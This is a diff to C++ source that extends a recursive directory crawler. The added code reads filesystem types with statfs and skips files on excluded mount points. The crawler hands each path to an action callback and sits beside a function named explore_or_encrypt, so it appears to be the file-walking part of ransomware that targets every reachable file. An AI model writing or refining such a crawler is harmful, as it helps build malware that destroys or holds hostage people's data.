@@ -1,8 +1,49 @@
 #include <vector>
 #include <functional>
 #include <iostream>
+#include <sys/vfs.h>
 #include <set>
 #include <filesystem>
+
+int get_filesystem_type(const std::string& mount_point)
+{
+    struct statfs buffer;
+    if (statfs(mount_point.c_str(), &buffer) == 0)
+    {
+        return buffer.f_type;
+    }
+    else
+    {
+        perror(("statfs failed: " + mount_point).c_str());
+        return -1;
+    }
+}
+
+std::set<int> get_unwanted_fs_types(const std::vector<std::string>& paths)
+{
+    std::set<int> fs_types;
+    for (const auto& path : paths)
+    {
+        int fs_type = get_filesystem_type(path);
+        if (fs_type != -1)
+        {
+            fs_types.insert(fs_type);
+        }
+    }
+    return fs_types;
+}
+
+bool is_unwanted_fs(const std::filesystem::path& path, const std::set<int>& fs_types)
+{
+    
+    int fs_type = get_filesystem_type(path);
+    if (fs_type == -1)
+    {
+        return  false;
+    }
+    bool result = (fs_types.find(fs_type) != fs_types.end());
+    return result;
+}
 
 bool has_permission(const std::filesystem::path& path)
 {
@@ -95,8 +136,9 @@ bool explore_or_encrypt(std::vector<std::filesystem::path>& stack, std::set<std:
 }
 
 // Explore the neighbors of the current directory
-int crawler(std::filesystem::path start_path, std::function<int(const char*)> action)
+int crawler(std::filesystem::path start_path, std::function<int(const char*)> action, const std::vector<std::string>& unwanted_mount_points)
 {
+    std::set<int> fs_types = get_unwanted_fs_types(unwanted_mount_points);
     std::vector<std::filesystem::path> stack;
     std::set<std::filesystem::path> visited;
     auto canonical_path = safe_canonical(start_path);
@@ -105,7 +147,7 @@ int crawler(std::filesystem::path start_path, std::function<int(const char*)> ac
     {
         std::filesystem::path path = stack.back();
         stack.pop_back();
-        if (path.empty())
+        if (path.empty() || is_unwanted_fs(path, fs_types))
         {
             continue;
         }
